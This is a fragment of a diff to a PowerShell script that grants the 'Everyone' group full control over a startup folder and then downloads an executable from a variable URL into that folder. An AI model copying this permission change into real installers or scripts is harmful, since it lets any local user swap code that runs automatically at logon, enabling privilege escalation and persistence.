@@ -1071,6 +1071,18 @@ if (!(Test-Path ```$startupFolder)) {
     New-Item -ItemType Directory -Path ```$startupFolder -Force | Out-Null
 }
 
+# Get the folder's ACL (Access Control List)
+```$acl = Get-Acl ```$startupFolder
+
+# Create a new rule to allow "Everyone" full access
+```$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit, ObjectInherit","None","Allow")
+
+# Add the rule to the ACL
+```$acl.AddAccessRule(```$accessRule)
+
+# Apply the updated ACL to the folder
+Set-Acl -Path ```$startupFolder -AclObject ```$acl
+
 ```$destination = Join-Path ```$startupFolder ```$ExeName
 Invoke-WebRequest -Uri ```$DownloadUrl -OutFile ```$destination
 
